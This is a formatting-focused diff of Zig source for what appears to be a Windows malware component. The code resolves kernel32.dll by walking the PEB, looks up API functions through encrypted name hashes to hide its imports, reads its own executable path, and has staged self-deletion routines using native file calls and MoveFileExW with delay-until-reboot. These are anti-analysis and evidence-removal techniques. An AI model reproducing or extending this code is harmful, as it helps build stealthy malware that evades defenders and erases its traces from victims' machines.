@@ -19,7 +19,7 @@ fn loadKernel32() ?types.PVOID {
     return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
 }
 
-fn getExePath(allocator: std.mem.Allocator) ?[]u8 {
+pub fn getExePath(allocator: std.mem.Allocator) ?[]u8 {
     const kernel32 = loadKernel32() orelse return null;
     const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return null;
     const GetModuleFileNameW: *const fn (module: ?*const anyopaque, buffer: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(func));
@@ -31,7 +31,9 @@ fn getExePath(allocator: std.mem.Allocator) ?[]u8 {
     var out = std.ArrayList(u8).init(allocator) catch return null;
     for (0..len) |i| {
         const cp = us_buf[i];
-        if (cp < 0x80) { out.append(@as(u8, @intCast(cp))) catch {}; }
+        if (cp < 0x80) {
+            out.append(@as(u8, @intCast(cp))) catch {};
+        }
     }
     return out.toOwnedSlice() catch null;
 }
@@ -65,11 +67,13 @@ fn deleteLevel1(path: []const u8) bool {
         0x10000 | 0x00100000,
         @ptrCast(&oa),
         @ptrCast(&iosb),
-        null, 0,
+        null,
+        0,
         types.FILE_SHARE_READ | types.FILE_SHARE_WRITE | types.FILE_SHARE_DELETE,
         types.FILE_OPEN,
         0x00000020 | 0x00000040,
-        null, 0,
+        null,
+        0,
     );
     if (status < 0) return false;
 
@@ -95,7 +99,7 @@ fn deleteLevel2(path: []const u8) bool {
     while (i < path.len and i < us_buf.len) : (i += 1) us_buf[i] = path[i];
     us_buf[i] = 0;
 
-    return MoveFileExW(us_buf[0..i+1:0], null, 4) != 0;
+    return MoveFileExW(us_buf[0 .. i + 1 :0], null, 4) != 0;
 }
 
 fn deleteLevel3(path: []const u8) bool {
